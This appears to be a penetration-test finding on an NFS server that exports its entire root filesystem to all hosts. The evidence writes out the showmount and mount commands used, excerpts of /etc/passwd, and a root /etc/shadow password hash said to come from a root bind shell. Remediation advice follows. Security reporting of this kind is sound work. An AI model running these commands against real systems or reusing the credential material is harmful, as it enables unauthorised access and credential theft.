title: NFS Root Filesystem Export to All Hosts
description: The NFS server exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the entire filesystem and read sensitive files including /etc/passwd. Combined with the root shell, /etc/shadow with password hashes was also extracted.
evidence:
showmount -e 192.168.0.140:
Export list for 192.168.0.140:
/ *

After mounting:
mount -t nfs 192.168.0.140:/ /tmp/nfs_mount -o nolock

/etc/passwd readable:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh

/etc/shadow (obtained via root bind shell):
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
remediation: Restrict NFS exports to specific hosts and subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication.
